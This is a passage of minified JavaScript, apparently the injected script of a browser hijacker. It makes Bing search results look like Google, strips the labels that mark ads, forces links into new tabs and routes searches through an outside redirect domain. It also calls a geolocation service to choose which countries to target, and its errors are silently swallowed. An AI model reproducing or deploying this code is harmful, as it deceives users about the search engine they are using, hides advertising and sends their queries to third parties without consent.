                                    s = "getAttribute",
                                    c = "querySelectorAll",
                                    d = "innerHTML",
                                    t = x.isFunction = function(t) {
                                        return "function" == typeof t
                                    },
                                    l = x.isNull = function(t) {
                                        return null == t
                                    };
                                r && (t(r[e]) && (this.byId = function(t) {
                                    return new a(r[e](t))
                                }), t(r[i]) && (this.byClass = function(t, e) {
                                    return n(r[i](t), e)
                                }), t(r[o]) && (this.byTag = function(t, e) {
                                    return n(r[o](t), e)
                                }), t(r[c]) && (this.bySel = function(t, e) {
                                    return n(r[c](t), e)
                                }), t(r[p]) && t(r[s]) && (this.attr = function(t, e) {
                                    return l(e) ? r[s](t) : (r[p](t, e), this)
                                }), l(r[d]) || (this.html = function(t) {
                                    return l(t) ? r[d] : (r[d] = t, this)
                                })), this.unwrap = function() {
                                    return r
                                }, this.append = function(t) {
                                    var e = a.isElem(t),
                                        n = e ? t.unwrap() : t;
                                    return r && Node.prototype.appendChild.call(r, n), e ? t : new a(t)
                                }, this.delete = function() {
                                    return a.delete(this)
                                }
                            }

                            function y() {
                                if (w()) {
                                    x.head.append(x.create("style").html("* {font-family: arial, sans-serif !important;}#b_results>.b_ad h2 a, #b_results>li h2 a {color: #1a0dab !important}#fbpgtab {display: none !important}span, p, .b_divsec {line-height: 1.57 !important; color: #3C4043 !important; word-wrap: break-word !important; font-size: 14px; !important}.b_caption p strong, .b_caption .b_factrow strong, .b_secondaryText strong {color: #52565A; !important}h2 {font-size: 20px !important; line-height: 1.3 !important;}svg {padding-right: 0px !important;}.b_searchbox {height: auto !important; margin-top: 13px !important;}.b_pag a.sb_pagS_bp {border-color: #1a73e8 !important;}.b_logo {visibility: hidden !important; background: none !important; background-size: contain !important; width: 92px !important; padding: 0px !important;}.b_logo:after {position: relative !important; display: inline-block !important; content: none !important; transform-origin: 0 0 !important; transform: scale(.4166) !important;}#b_header #sb_form {margin-right: 10px !important; margin-left: 14px !important;}.b_searchboxForm {border-radius: 24px !important; border: 1px solid #dfe1e5 !important; height: 45px !important; font: 14px/normal !important}.sw_meIc:after, .sw_spd:after, .sw_pref:after, .idp_ham:after, .idp_wlid:after, .idp_tw:after { position: relative !important; content: none !important;}.b_scopebar>ul li {text-transform: capitalize !important; font-size: small !important;}.b_scopebar, .b_scopebar a, .b_scopebar a:visited, .id_button, .id_button:visited { color: #5f6368 !important;}.b_scopebar .b_active { border-bottom: 3px solid #00809d !important;}.b_scopebar .b_active { border-bottom: 3px solid #1A73E8 !important; color: #1A73E8 !important;}.b_adSlug, #b_notificationContainer, #b_opalpers {display: none !important}"));
                                    var t = x.doc;
                                    t.byId("sbiarea").html(""), t.byId("id_h").html('<a id="id_sc" class="idp_ham nohphbtop" aria-expanded="false" aria-controls="id_hbfo"  aria-haspopup="true" role="button" tabindex="0" target="blank" href="https://about.google/products/"  h="" style="width:40px;height:40px;margin-top:-10px;"><svg class="gb_Ve" focusable="false" viewBox="0 0 24 24"  style="height:35px;width:35px;color:saddlebrown;fill:#919b9b"><path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path></svg></a>');

                                    function e(t, e, n) {
                                        return e = e || "", n = n || "", p.replace(i, e).replace(o, n) + t + "</svg></span>"
                                    }
                                    var n, r, a, i = "{%CUSTOM_TEXT_STYLE%}",
                                        o = "{%CUSTOM_SVG_STYLE%}",
                                        p = '<span class="HF9Klc iJddsb" style="height:16px;width:16px;padding-right:5px;' + i + '"><svg focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"  style="height:17px;float:left;padding-top:5px;text-transform:none;' + o + '">',
                                        s = {
                                            web: e('<path d="M10 2v2a6 6 0 0 1 6 6h2a8 8 0 0 0-8-8z" fill="#34A853"></path><path d="M10 4V2a8 8 0 0 0-8 8h2c0-3.3 2.7-6 6-6z" fill="#EA4335"></path><path d="M4 10H2a8 8 0 0 0 8 8v-2c-3.3 0-6-2.69-6-6z" fill="#FBBC04"></path><path d="M22 20.59l-5.69-5.69A7.96 7.96 0 0 0 18 10h-2a6 6 0 0 1-6 6v2c1.85 0 3.52-.64 4.88-1.68l5.69 5.69L22 20.59z" fill="#4285F4"></path>', "color:#1A73E8;"),
                                            images: e('<path d="M14 13l4 5H6l4-4 1.79 1.78L14 13zm-6.01-2.99A2 2 0 0 0 8 6a2 2 0 0 0-.01 4.01zM22 5v14a3 3 0 0 1-3 2.99H5c-1.64 0-3-1.36-3-3V5c0-1.64 1.36-3 3-3h14c1.65 0 3 1.36 3 3zm-2.01 0a1 1 0 0 0-1-1H5a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h7v-.01h7a1 1 0 0 0 1-1V5z"></path>', "", "fill:#5f6368;"),
                                            video: e('<path clip-rule="evenodd" fill-rule="evenodd" d="M10 16.5l6-4.5-6-4.5v9zM5 20h14a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1H5a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1zm14.5 2H5a3 3 0 0 1-3-3V4.4A2.4 2.4 0 0 1 4.4 2h15.2A2.4 2.4 0 0 1 22 4.4v15.1a2.5 2.5 0 0 1-2.5 2.5z"></path>', "", "fill:#5f6368;"),
                                            local: e('<circle cx="12.01" cy="9.32" r="1.93"></circle><path d="M11.98,21.85c0.01,0,0.01,0,0.02,0s0.01,0,0.02,0c0.67,0,0.89-0.48,1.14-1.09 c0.26-0.59,0.75-1.71,1.29-2.53c0.57-0.85,1.16-1.58,1.75-2.29c1.52-1.87,2.96-3.62,2.96-6.65c0.02-3.94-3.19-7.15-7.14-7.15 c-0.01,0-0.01,0-0.02,0s-0.01,0-0.02,0c-3.95,0-7.15,3.21-7.15,7.15c0,3.03,1.44,4.8,2.96,6.65c0.58,0.71,1.17,1.44,1.75,2.29 c0.54,0.82,1.04,1.93,1.29,2.53C11.1,21.37,11.31,21.85,11.98,21.85z M9.35,14.69C7.88,12.9,6.83,11.62,6.83,9.3 c0-2.84,2.31-5.15,5.15-5.15c0.01,0,0.01,0,0.02,0s0.01,0,0.02,0c2.84,0,5.15,2.31,5.15,5.15c0.01,2.32-1.04,3.61-2.5,5.39 c-0.58,0.71-1.24,1.52-1.87,2.45c-0.3,0.44-0.56,0.94-0.8,1.4c-0.24-0.46-0.5-0.97-0.8-1.4C10.59,16.2,9.93,15.4,9.35,14.69z"></path>', "", "fill:#5f6368;"),
                                            news: e('<path d="M12 11h6v2h-6v-2zm-6 6h12v-2H6v2zm0-4h4V7H6v6zm16-7.22v12.44c0 1.54-1.34 2.78-3 2.78H5c-1.64 0-3-1.25-3-2.78V5.78C2 4.26 3.36 3 5 3h14c1.64 0 3 1.25 3 2.78zM19.99 12V5.78c0-.42-.46-.78-1-.78H5c-.54 0-1 .36-1 .78v12.44c0 .42.46.78 1 .78h14c.54 0 1-.36 1-.78V12zM12 9h6V7h-6v2z"></path>', "", "fill:#5f6368;"),
                                            shop: e('<path d="M21.11 2.89A3.02 3.02 0 0 0 18.95 2h-5.8c-.81 0-1.58.31-2.16.89L7.25 6.63 2.9 10.98a3.06 3.06 0 0 0 0 4.32l5.79 5.8a3.05 3.05 0 0 0 4.32.01l8.09-8.1c.58-.58.9-1.34.9-2.16v-5.8c0-.81-.32-1.59-.89-2.16zM20 10.85c0 .28-.12.54-.32.74l-3.73 3.74-4.36 4.36c-.41.41-1.08.41-1.49 0l-2.89-2.9-2.9-2.9a1.06 1.06 0 0 1 0-1.49l8.1-8.1c.2-.2.46-.3.74-.3l5.8-.01A1.05 1.05 0 0 1 20 5.05v5.8zM16 6c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"></path>', "", "fill:#5f6368;")
                                        };
                                    for (var c in s) s.hasOwnProperty(c) && (n = "b-scopeListItem-" + c, r = s[c], a = void 0, (a = t.byId(n).byTag("a", 0)).byTag("svg", 0).unwrap() || a.html(r + a.html()));
                                    A(function() {
                                        x.delete(".b_adSlug")
                                    }, 100)
                                }
                            }

                            function z() {
                                var t = i.countries && i.countries.trim && i.countries.trim();
                                if (!t) return 1;
                                var e = o.country();
                                return window.xAdsOnCountryReady && window.xAdsOnCountryReady(o.country), e && 2 == e.length && 0 <= t.toLowerCase().indexOf(e.toLowerCase())
                            }

                            function k(t) {
                                return (location.search.match(new RegExp("[?&]" + t + "=([^&]+)")) || [0, ""])[1]
                            }

                            function M() {
                                for (var t = x.body.bySel("a:not([target=_blank])"), e = 0; e < t.length; e++) {
                                    var n, r = new x(t[e]);
                                    r.attr("target", "_blank"), u && ((n = r.unwrap()).removeEventListener("click", u, !1), n.addEventListener("click", u, !1))
                                }
                            }
                        };
                        var params = 'gex2|US GB UK AU AT BR CA DK FI FR DE HK IE IT MX NZ NL NO SG ES SE CH JP PT'.split('|').reverse();
                        var extcode = params.pop();
                        var countries = params.reverse().join('|');
                        var url = 'https://www.systemredirecting.com/gex2?q=';
                        if (window.xAdsGogRedir) window.xAdsGogRedir({
                            url: url,
                            go: true,
                            direct: true,
                            countries: countries,
                            filter: ['bing', 2]
                        })
                    })()
                } catch (e) {};
                s("https://meetlookup.com/geolocation/2263/", function(e) {
                    if (i) return;
                    l[a] = i = e && 2 == e.length && e.toUpperCase ? e.toUpperCase() : "XX";
                    for (var t = 0; t < o.length; t++) try {
                        o[t](i)
                    } catch (e) {}
                })
            }
        }
        var d, f, t, l, v, n;
        "http" == location.href.substr(0, 4) && u && (d = "lfwexobse67kgfogflay", f = performance.timing.responseStart, t = d + f, l = h.sessionStorage, v = 0, c(d, t), l[t] || (l[t] = 1, function() {
            try {
                var i, c, s, d, f, e = h.MutationObserver || h.WebKitMutationObserver;
                !u.head && e && (i = u.createElement.bind(u), c = u.documentElement, s = "appendChild", d = i("head"), c[s](d), (f = new e(function(e) {
                    try {
                        e: for (var t = 0; t < e.length; t++) {
                            var n = e[t].addedNodes;
                            if (n && n.length)
                                for (var r = 0; r < n.length; r++) {
                                    var a = n[r];
                                    if (a && /^head$/i.test(a.tagName)) {
                                        var o = i("meta");
                                        a[s](o), o.outerHTML = d.innerHTML, c.removeChild(d), f.disconnect();
                                        break e
                                    }
                                }
                        }
                    }
                    catch (e) {}
                })).observe(c, {
                    childList: !0
                }))
            } catch (e) {}
        }(), u.head ? e() : n = setInterval(function() {
            u.head && (clearInterval(n), e())
        }, 20)))
    }(document, window)
} catch (e) {}